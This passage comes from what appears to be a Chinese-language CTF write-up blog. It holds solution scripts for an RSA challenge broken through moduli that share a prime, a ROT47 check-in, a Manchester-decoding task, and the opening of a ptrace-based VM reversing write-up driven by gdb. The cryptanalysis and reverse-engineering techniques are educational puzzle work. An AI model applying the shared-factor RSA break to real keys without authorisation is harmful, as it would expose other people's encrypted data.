class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span>)</span><br><span class="line">c.append( <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span>)</span><br><span class="line">c.append( <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span>)</span><br><span class="line">c.append( <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span>)</span><br><span class="line">c.append( <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span>)</span><br><span class="line">c.append( <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span>)</span><br><span class="line">c.append( <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span>)</span><br><span class="line">c.append( <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span>)</span><br><span class="line">c.append( <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span>)</span><br><span class="line">c.append( <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span>)</span><br><span class="line">c.append( <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span>)</span><br><span class="line">c.append( <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span>)</span><br><span class="line">c.append( <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span>)</span><br><span class="line">c.append( <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span>)</span><br><span class="line">c.append( <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span>)</span><br><span class="line">c.append( <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span>)</span><br><span class="line">c.append( <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span>)</span><br><span class="line">c.append( <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span>)</span><br><span class="line"></span><br><span class="line">n.append( <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span>)</span><br><span class="line">c.append( <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span>)</span><br><span class="line"><span class="comment"># m = 1</span></span><br><span class="line"><span class="comment"># for i in c:</span></span><br><span class="line"><span class="comment">#     m*=i</span></span><br><span class="line"><span class="comment"># M = []</span></span><br><span class="line"><span class="comment"># for i in c:</span></span><br><span class="line"><span class="comment">#     M.append(m//i)</span></span><br><span class="line"><span class="comment"># Mp = []</span></span><br><span class="line"><span class="comment"># for i in range(len(c)):</span></span><br><span class="line"><span class="comment">#     Mp.append(gmpy2.invert(M[i],c[i]))</span></span><br><span class="line"><span class="comment"># x = 0</span></span><br><span class="line"><span class="comment"># for i in range(len(c)):</span></span><br><span class="line"><span class="comment">#     x +=Mp[i]*M[i]*n[i]</span></span><br><span class="line"><span class="comment">#     x%=m</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(x))</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line">ind = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(n)):</span><br><span class="line">        <span class="keyword">if</span> i!=j <span class="keyword">and</span> gmpy2.gcd(n[i],n[j])!=<span class="number">1</span>:</span><br><span class="line">            p = gmpy2.gcd(n[i],n[j])</span><br><span class="line">            q = n[i]//p</span><br><span class="line">            ind = i</span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(long_to_bytes(gmpy2.powmod(c[ind],d,p*q)))</span><br></pre></td></tr></table></figure>

<h2 id="crypto-GXYCTF2019-CheckIn"><a href="#crypto-GXYCTF2019-CheckIn" class="headerlink" title="[crypto][GXYCTF2019]CheckIn"></a>[crypto][GXYCTF2019]CheckIn</h2><p>ROT47 编码的ASCII范围是33-126</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = base64.b64decode(<span class="string">b&#x27;dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="crypto-传感器"><a href="#crypto-传感器" class="headerlink" title="[crypto]传感器"></a>[crypto]传感器</h2><p>都传感器了，还曼联，肯定是曼彻斯特编码，我懒了</p>
<p><a target="_blank" rel="noopener" href="https://www.xmsec.cc/manchester-encode/">https://www.xmsec.cc/manchester-encode/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = []</span><br><span class="line">s = <span class="number">0x5555555595555A65556AA696AA6666666955</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> s==<span class="number">0</span>:</span><br><span class="line">    b = bin(s&amp;<span class="number">0xf</span>)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(b)&lt;<span class="number">4</span>:</span><br><span class="line">        b = (<span class="number">4</span>-len(b))*<span class="string">&#x27;0&#x27;</span>+b</span><br><span class="line">    a.append(b)</span><br><span class="line">    s&gt;&gt;=<span class="number">4</span></span><br><span class="line">a = a[::<span class="number">-1</span>]</span><br><span class="line">print(a)</span><br><span class="line">data = []</span><br><span class="line">su = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i[:<span class="number">2</span>]==<span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">        data.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:data.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> i[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">        data.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: data.append(<span class="number">0</span>)</span><br><span class="line">print(data)</span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(data),<span class="number">8</span>):</span><br><span class="line">    su=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i,i+<span class="number">8</span>):</span><br><span class="line">        su=su+(data[j]&lt;&lt;(j-i))</span><br><span class="line">    r.append(su)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">    res+=hex(i)[<span class="number">2</span>:]</span><br><span class="line">print(res)</span><br><span class="line">print(res.upper())</span><br></pre></td></tr></table></figure>

<h2 id="rev-De1CTF2019-Signal-vm"><a href="#rev-De1CTF2019-Signal-vm" class="headerlink" title="[rev][De1CTF2019]Signal vm"></a>[rev][De1CTF2019]Signal vm</h2><p><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2019/08/08/RE/Linux/de1ctf19-signal-vm/">https://blog.bi0s.in/2019/08/08/RE/Linux/de1ctf19-signal-vm/</a></p>
<p>文件采用了静态编译，经过分析，得到了fork,wait4,ptrace函数</p>
<p>IDA中Shift+F5添加libc签名库</p>
<p>添加ptrace的enum库便于识别ptrace动作，使用M将常数转化为enum表示；ptrace使用PEEK_TEXT时读取的是64位字</p>
<p>程序采用父子进程调试的形式</p>
<p>strace 工具可以打印程序的执行路径</p>
<p>可以使用python+gdb自动化找出指令(需要关闭pwngdb等插件)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;file ./signal_vm&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set follow-fork-mode parent&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;b *0x40147e&#x27;</span>) <span class="comment"># return value of wait</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;b *0x400C60&#x27;</span>) <span class="comment"># return value of ptrace</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;b *0x40172d&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;b *0x400C40&#x27;</span>) <span class="comment"># get rip at rdx</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;r &lt; input&#x27;</span>)</span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;ni&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exedip = set()</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&#x27;out.asm&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">s = <span class="literal">None</span></span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line">lastip=<span class="number">0</span></span><br><span class="line">toDword = <span class="keyword">lambda</span> x:x[<span class="number">0</span>]|(x[<span class="number">1</span>]&lt;&lt;<span class="number">8</span>)|(x[<span class="number">2</span>]&lt;&lt;<span class="number">16</span>)|(x[<span class="number">3</span>]&lt;&lt;<span class="number">24</span>)</span><br><span class="line">res = 